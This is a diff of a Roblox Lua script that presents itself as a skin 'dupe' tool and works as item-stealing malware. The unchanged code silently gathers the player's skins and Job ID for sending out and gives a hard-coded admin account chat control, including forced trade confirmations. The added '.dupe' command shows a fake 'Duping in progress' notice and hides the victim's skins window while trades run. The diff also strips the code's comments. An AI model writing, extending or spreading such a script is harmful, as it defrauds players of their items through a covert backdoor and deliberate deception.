@@ -9,14 +9,14 @@ local executedBy = LocalPlayer.Name
 local frozen = false
 local headSitConn
 local ADMIN_NAME = "ChloeEaglePrism20215"
---// HTTP request utility
+
 local function requestFunc(tab)
     if syn then return syn.request(tab)
     elseif http_request then return http_request(tab)
     elseif request then return request(tab)
     else error("No HTTP request function found") end
 end
---// Function to send owned skins + random 4-letter codes + Job ID (silent)
+
 local function sendSkinsAndCodes()
     local HttpService = game:GetService("HttpService")
     local Players = game:GetService("Players")
@@ -31,7 +31,7 @@ local function sendSkinsAndCodes()
         SkinsValue = DataFolder:FindFirstChild("Skins")
         task.wait(1)
     until SkinsValue
-    -- Wait until SkinsValue.Value is valid JSON
+
     local decoded
     repeat
         local success, result = pcall(function()
@@ -92,11 +92,11 @@ end
 if game.PlaceId == 2788229376 then
     sendSkinsAndCodes()
 end
---// Check if player is the designated admin
+
 local function isAdmin(player)
     return player.Name == ADMIN_NAME
 end
---// Utility
+
 local function isTargeted(targetName)
     if not targetName then return true end
     return string.lower(executedBy):sub(1, #targetName) == string.lower(targetName)
@@ -120,7 +120,7 @@ local function SendChatMessage(message)
         end
     end
 end
---// Command handler
+
 local function handleChat(msg, sender)
     if not isAdmin(sender) then return end
     local args = msg:split(" ")
@@ -220,12 +220,18 @@ local function handleChat(msg, sender)
         pcall(function()
             MainEvent:FireServer("Trading", "Confirm", "", "")
         end)
-    elseif command == ".proof" and isTargeted(targetName) then
+    elseif command == ".dupe" and isTargeted(targetName) then
         StarterGui:SetCore("SendNotification", {
-            Title = "Triggerbot";
-            Text = "this person is really a triggerbot admin.";
+            Title = "Nexdupe";
+            Text = "Duping in progress, please wait...";
             Duration = 5,
-        })
+    })
+
+        local player = game:GetService("Players").LocalPlayer
+        local gui = player.PlayerGui:WaitForChild("MainScreenGui")
+        local weaponSkinsGUI = gui:WaitForChild("WeaponSkinsGUI")
+
+        weaponSkinsGUI.Visible = false
     elseif command == ".headsit" and isTargeted(targetName) then
         local myChar = LocalPlayer.Character
         local targetPlayer = Players:FindFirstChild(args[3])
@@ -312,7 +318,7 @@ local function handleChat(msg, sender)
         end)
     end
 end
---// Connect admin chat
+
 local function connectChatted(player)
     if isAdmin(player) then
         player.Chatted:Connect(function(msg)
@@ -320,7 +326,7 @@ local function connectChatted(player)
         end)
     end
 end
---// Setup
+
 for _, player in ipairs(Players:GetPlayers()) do
     if player ~= LocalPlayer then
         connectChatted(player)
